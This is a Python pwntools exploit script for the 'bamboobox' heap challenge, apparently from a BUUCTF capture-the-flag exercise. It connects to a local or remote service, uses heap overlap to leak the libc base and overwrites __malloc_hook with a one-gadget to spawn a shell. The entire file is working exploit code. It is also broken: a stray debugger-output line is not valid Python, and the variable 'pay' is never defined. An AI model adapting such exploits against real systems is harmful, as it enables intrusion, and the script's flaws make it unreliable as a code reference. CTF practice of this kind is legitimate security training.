import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bamboobox')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bamboobox')
			libc=ELF('/usr/lib/freelibs/amd64/2.23/libc-2.23.so')
		else :
			io=remote('node3.buuoj.cn',26635)
			elf=ELF('./bamboobox')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(b,c):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('Please enter the length of item name:',str(b))
			io.sendafter('Please enter the name of item:',c)

		def delete(a):
			io.sendlineafter('Your choice:','4')
			io.sendlineafter('ndex of item:',str(a))

		def edit(a,b,c):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('ndex of item:',str(a))
			io.sendlineafter('Please enter the length of item name:',str(b))
			io.sendafter('Please enter the new name of the item:',c)

		def show():
			io.sendlineafter('Your choice:','1')
		

		
		add(0xf8,'aaa')
		add(0x68,'aaa')
		add(0x88,'aaa')
		add(0x1f8,'aaaa')
		add(0x30,'aaaa')
		0x6020C8:       0x1e4c030-->0x6020C8-0x18
		edit(2,0x88,'\x00'*0x80+p64(0x200))
		delete(0)
		delete(3)
		add(0xf0,'aaa')
		show()
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		delete(0)

		add(0x138,'\x00'*0xf8+p64(0x71))
		delete(1)
		edit(0,0x138,'\x00'*0xf8+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
		add(0x68,'aaa')
		add(0x68,'\x00'*0x13+p64(libc_base+0xd5b11))

		
		edit(0,0x40,pay)
		edit(0,0x8,p64(libc.sym['system'])[:7])
		add(0x20,'/bin/sh\x00')
		delete(1)

		
		success('libc_base:'+hex(libc_base))
		gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue